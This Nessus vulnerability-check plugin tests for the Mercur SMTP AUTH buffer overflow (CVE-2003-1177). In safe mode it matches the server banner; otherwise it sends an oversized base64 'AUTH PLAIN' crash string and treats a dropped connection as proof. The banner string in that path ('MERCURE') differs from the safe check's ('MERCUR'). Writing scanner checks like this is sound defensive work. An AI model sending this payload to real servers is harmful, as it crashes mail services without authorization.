#
# (C) Tenable Network Security
#

if(description)
{
 script_id(11910);
 script_cve_id("CVE-2003-1177");
 script_bugtraq_id(8861);
 script_version("$Revision: 1.6 $");
# if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2003-A-");

 name["english"] = "Mercur SMTP server AUTH overflow";

 script_name(english:name["english"]);

 desc["english"] = "
The remote Atrium Mercur SMTP server (mail server) seems to be vulnerable 
to a remote buffer overflow.  Successful exploitation of this vulnerability
would give a remote attacker administrative access to the mail server and
access to potentially confidential data. 

See also : http://www.atrium-software.com/mercur/mercur_e.html 
Solution : Contact your vendor or visit atrium-software.com for a patch.
Risk : High";

 script_description(english:desc["english"]);

 summary["english"] = "Checks for the Mercur remote buffer overflow";

 script_summary(english:summary["english"]);

 script_category(ACT_MIXED_ATTACK);


 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/smtp", 25);
 exit(0);
}


# start script code

include("smtp_func.inc");


port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (!get_port_state(port)) exit(0);


if ( safe_checks() )
{
 banner = get_smtp_banner(port:port);
 if ( ! banner ) exit(0);

 if(egrep(pattern:"^220.*MERCUR SMTP-Server .v([0-3]\.|4\.0?([01]\.|2\.0))",
	  string:banner))security_hole(port);
 exit(0);
}

# this test string provided by
# Kostya KORTCHINSKY on FD mailing list at netsys

req = string("AUTH PLAIN kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ");


banner = get_smtp_banner(port:port);
if ("MERCURE SMTP-Server" >!< banner)
  exit (0);

soc=open_sock_tcp(port);
if (!soc) exit(0);
send (socket:soc, data:req);     
close(soc);
soc = open_sock_tcp(port);
if (!soc) security_hole(port);
exit(0);












